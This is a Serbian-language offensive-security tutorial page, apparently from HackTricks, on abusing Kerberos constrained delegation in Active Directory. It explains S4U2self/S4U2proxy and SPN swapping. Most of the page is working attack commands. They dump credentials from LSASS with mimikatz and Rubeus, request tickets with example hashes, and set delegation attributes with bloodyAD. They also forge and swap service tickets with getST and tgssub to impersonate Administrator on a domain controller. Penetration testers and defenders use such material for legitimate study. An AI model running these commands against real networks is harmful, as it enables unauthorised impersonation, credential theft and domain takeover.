# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Korišćenjem ovoga, Domain admin može da **dozvoli** računaru da se **predstavlja kao korisnik ili računar** prema bilo kom **servisu** na računaru.

- **Service for User to self (_S4U2self_):** Bilo koji **service account koji poseduje SPN** obično može da dobije TGS za sebe u ime proizvoljnog korisnika. Ako nalog takođe ima [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) u _userAccountControl_, taj TGS je **forwardable**, što protocol transition čini direktno korisnim za **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** **service account** može da dobije TGS u ime korisnika za SPN-ove navedene u **msDS-AllowedToDelegateTo**. Evidence ticket korišćen u S4U2Proxy mora biti **forwardable** ticket ka delegirajućem servisu: ili stvarni client-to-service ticket uhvaćen od žrtve, ili onaj generisan pomoću **S4U2Self + T2A4D**.

**Napomena**: Ako je korisnik u AD označen kao ‘_Account is sensitive and cannot be delegated_’ ili je član grupe **Protected Users**, obično **nećete moći da se predstavljate kao** taj korisnik putem constrained delegation. U modernim domenima, pri ciljanju naloga sa omogućenim delegation-om, prednost dajte **AES** materijalu u odnosu na pretpostavke zasnovane isključivo na RC4.

To znači da, ako **kompromitujete hash service account-a**, možete da se **predstavljate kao korisnici** i da u njihovo ime dobijete **pristup** bilo kom **servisu** na navedenim računarima (mogući **privesc**).

Pored toga, **nećete imati pristup samo servisu za koji korisnik može da se predstavi, već i bilo kom drugom servisu**, zato što se SPN (ime servisa koje se zahteva) ne proverava (ovaj deo u ticket-u nije enkriptovan/potpisan). Prema tome, ako imate pristup **CIFS servisu**, možete imati pristup i **HOST servisu** koristeći flag `/altservice` u Rubeus-u, na primer. Ista slabost SPN swapping-a zloupotrebljava se pomoću **Impacket getST -altservice** i drugih alata.

Takođe, **pristup LDAP servisu na DC-u** je ono što je potrebno za eksploataciju **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Napomena za operatora:** nemojte se oslanjati samo na **ADUC** ili BloodHound snimke ekrana za pregled **gMSA/sMSA**. Ti nalozi često ne prikazuju uobičajenu karticu Delegation, zato direktno enumerišite sirove atribute **`userAccountControl`** i **`msDS-AllowedToDelegateTo`**.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition vs Kerberos-only constrained delegation

Ako kompromitovani nalog ima **T2A4D**, obično možete završiti ceo **`S4U2Self -> S4U2Proxy`** lanac samo pomoću service key/TGT.<sup>[[2]](#references)</sup>

Ako ima samo **`msDS-AllowedToDelegateTo`** (klasični režim **"Use Kerberos only"**), delegation i dalje može da se zloupotrebi, ali evidence ticket za S4U2Proxy mora biti **stvaran forwardable user-to-service ticket** za delegating service. U praksi to znači krađu ili presretanje victim TGS-a iz **LSASS/ccache** i njegovo prosleđivanje u drugu fazu (`/tgs:` u Rubeus-u). **Non-forwardable** S4U2Self ticket nije dovoljan za classic constrained delegation; ako je to vaš jedini evidence ticket, proverite [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>

### Cross-domain constrained delegation notes (2025+)

Od **Windows Server 2012/2012 R2**, KDC podržava constrained delegation između domena/forest-a putem S4U2Proxy ekstenzija. Moderne verzije (Windows Server 2016–2025) zadržavaju ovo ponašanje i dodaju dva PAC SID-a koji signaliziraju protocol transition:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) kada se korisnik normalno autentifikovao.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) kada je service potvrdio identitet putem protocol transition-a.

Očekujte `SERVICE_ASSERTED_IDENTITY` unutar PAC-a kada se protocol transition koristi između domena, što potvrđuje da je S4U2Proxy korak uspešno završen.<sup>[[1]](#references)</sup>

### Impacket / Linux tooling (altservice & full S4U)

Noviji Impacket (0.11.x+) izlaže isti S4U lanac i SPN swapping kao Rubeus:<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
Ako više volite da prvo forged-ujete korisnički ST (npr. kada imate samo offline hash), uparite **ticketer.py** sa **getST.py** za S4U2Proxy. **tgssub.py** je takođe koristan kada već imate funkcionalan ccache i potrebno je samo da zamenite klasu servisa za isti host. Pogledajte otvoreni Impacket issue #1713 za aktuelne specifičnosti (KRB_AP_ERR_MODIFIED kada se forged ST ne podudara sa SPN ključem).<sup>[[2]](#references)</sup>

### Automatizacija podešavanja delegacije pomoću kredencijala sa niskim privilegijama

Ako već imate **GenericAll/WriteDACL** nad računarom ili service account-om, potrebne atribute možete udaljeno postaviti bez RSAT-a koristeći **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Ovo vam omogućava da napravite putanju constrained delegation za privesc bez DA privilegija čim budete mogli da upisujete te atribute.

- Step 1: **Preuzmite TGT dozvoljenog servisa**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Postoje **drugi načini za dobijanje TGT tiketa** ili **RC4** ili **AES256** bez SYSTEM privilegija na računaru, kao što su Printer Bug i unconstrained delegation, NTLM relaying i zloupotreba Active Directory Certificate Service-a
>
> **Samo posedovanjem tog TGT tiketa (ili njegovog hash-a) možete izvesti ovaj napad bez kompromitovanja celog računara.**

- Korak 2: **Dobavite TGS za servis koji se predstavlja kao korisnik**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Više informacija na ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) i [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## Reference

- [1] [Pregled Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Zloupotreba Delegation pomoću Impacket-a (2. deo): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity Killed the Domain: Offensive pregled Kerberos-a (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

{{#include ../../banners/hacktricks-training.md}}
